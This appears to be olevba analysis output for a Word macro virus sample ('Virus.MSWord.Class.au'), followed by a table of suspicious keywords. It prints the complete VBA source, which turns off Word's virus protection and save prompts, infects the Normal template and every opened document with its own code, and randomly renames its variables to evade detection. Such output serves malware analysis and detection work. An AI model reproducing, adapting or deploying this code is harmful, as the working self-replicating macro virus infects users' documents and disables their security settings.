olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.au-c4f993a7f74d13bec42aa0735f6592b25db776c8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.au-c4f993a7f74d13bec42aa0735f6592b25db776c8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.ConfirmConversions = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
II6257 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
JM3028 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set HU4624 = ActiveDocument.VBProject.VBComponents.Item(1)
GI9222 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set HU4624 = NormalTemplate.VBProject.VBComponents.Item(1)
ML578 = True
Call AA8233_RL945
End If
If ML578 <> True And GI9222 <> True Then GoTo GN2985
If ML578 = True Then HU4624.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, II6257 - 1))
If GI9222 = True Then HU4624.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, JM3028 - 1))
GN2985:
If JM3028 <> 0 And II6257 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Sub AA8233_RL945()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "LG7640": r1(2) = "TF823": r1(3) = "HH5460": r1(4) = "FS5997": r1(5) = "RL945": r1(6) = "II6257"
r1(7) = "JM3028": r1(8) = "GI9222":: r1(9) = "HU4624": r1(10) = "ML578": r1(11) = "GN2985": r1(12) = "AA8233": r1(13) = "NF1647": r1(14) = "VD7866"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call RL945(a1, r1(x))
Next x
End Sub
Private Sub RL945(VD7866, NF1647 As String)  'v1.0
On Error Resume Next
Dim LG7640 As Long: Dim TF823 As Long: Dim HH5460 As Long: Dim FS5997 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
LG7640 = 1: TF823 = 1: HH5460 = .CountOfLines: FS5997 = Len(.Lines(.CountOfLines, 1))
Do While .Find(NF1647, LG7640, TF823, HH5460, FS5997, True)
strline = .Lines(LG7640, 1)
strline = Left(strline, TF823 - 1) & VD7866 & Mid(strline, FS5997)
.replaceline LG7640, strline
LG7640 = HH5460 + 1: TF823 = 1: DD2134 = .CountOfLines
FS5997 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

